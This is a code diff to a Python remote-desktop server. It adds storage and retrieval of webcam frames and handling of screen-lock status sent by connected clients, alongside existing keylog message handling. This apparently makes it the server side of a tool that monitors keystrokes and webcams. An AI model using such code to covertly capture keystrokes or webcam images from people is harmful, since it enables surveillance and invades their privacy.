@@ -102,6 +102,7 @@ class RemoteDesktopServer:
         self.port = port
         self.clients = {}
         self.frame_buffer = {}
+        self.webcam_buffer = {}  # Store webcam frames separately
         self.gui_callback = None  # Callback for GUI notifications
         self.webcam_error_callback = None  # Callback for webcam errors
         
@@ -379,12 +380,27 @@ class RemoteDesktopServer:
                         elif msg_type_byte == int(MessageType.HEARTBEAT):
                             # Heartbeat - just acknowledge
                             logger.debug(f"Received heartbeat from {client_id}")
+                        elif msg_type_byte == int(MessageType.WEBCAM_FRAME):
+                            # Webcam frame - decode and store
+                            try:
+                                msg_type, msg_data = ProtocolHandler.decode_message(data)
+                                # msg_data is already decompressed by decode_message for WEBCAM_FRAME
+                                self.webcam_buffer[client_id] = {
+                                    'frame_data': msg_data,
+                                    'timestamp': datetime.datetime.now()
+                                }
+                                logger.debug(f"Received webcam frame from {client_id} ({len(msg_data)} bytes)")
+                            except Exception as decode_err:
+                                logger.error(f"Failed to decode webcam frame: {decode_err}")
                         elif msg_type_byte == int(MessageType.WEBCAM_ERROR):
                             # Webcam error - decode and log
                             try:
                                 msg_type, msg_data = ProtocolHandler.decode_message(data)
                                 error_msg = msg_data.decode('utf-8')
                                 logger.warning(f"Webcam error from {client_id}: {error_msg}")
+                                # Clear webcam buffer on error
+                                if client_id in self.webcam_buffer:
+                                    del self.webcam_buffer[client_id]
                                 # Forward to web interface if callback is set
                                 if self.webcam_error_callback:
                                     try:
@@ -393,6 +409,25 @@ class RemoteDesktopServer:
                                         logger.error(f"Error in webcam error callback: {cb_err}")
                             except Exception as decode_err:
                                 logger.error(f"Failed to decode webcam error: {decode_err}")
+                        elif msg_type_byte == int(MessageType.LOCK_STATUS):
+                            # Lock status message
+                            try:
+                                msg_type, msg_data = ProtocolHandler.decode_message(data)
+                                import json
+                                lock_data = json.loads(msg_data.decode('utf-8'))
+                                is_locked = lock_data.get('locked', False)
+                                lock_type = lock_data.get('type', 'unknown')
+                                
+                                pc_name = self.clients.get(client_id, {}).get('pc_name', client_id)
+                                logger.info(f"Lock status from {pc_name}: locked={is_locked}, type={lock_type}")
+                                
+                                # Update client state in web server
+                                # This will be picked up by the web interface
+                                if hasattr(self, 'lock_status_callback') and self.lock_status_callback:
+                                    self.lock_status_callback(client_id, is_locked, lock_type)
+                                    
+                            except Exception as decode_err:
+                                logger.error(f"Failed to decode lock status: {decode_err}")
                         elif msg_type_byte == int(MessageType.KEYLOG):
                             # Keylog message
                             logger.info(f"Received KEYLOG message from {client_id}")
@@ -472,6 +507,8 @@ class RemoteDesktopServer:
                 del self.clients[client_id]
             if client_id in self.frame_buffer:
                 del self.frame_buffer[client_id]
+            if client_id in self.webcam_buffer:
+                del self.webcam_buffer[client_id]
             try:
                 if not writer.is_closing():
                     writer.close()
@@ -530,6 +567,15 @@ class RemoteDesktopServer:
         elif self.frame_buffer:
             # Return first available client's frame
             return next(iter(self.frame_buffer.values()))
+        return None
+    
+    def get_latest_webcam_frame(self, client_id: str = None) -> dict:
+        """Get latest webcam frame from buffer"""
+        if client_id:
+            return self.webcam_buffer.get(client_id)
+        elif self.webcam_buffer:
+            # Return first available client's webcam frame
+            return next(iter(self.webcam_buffer.values()))
         return None
     
     def get_connected_clients(self) -> list:
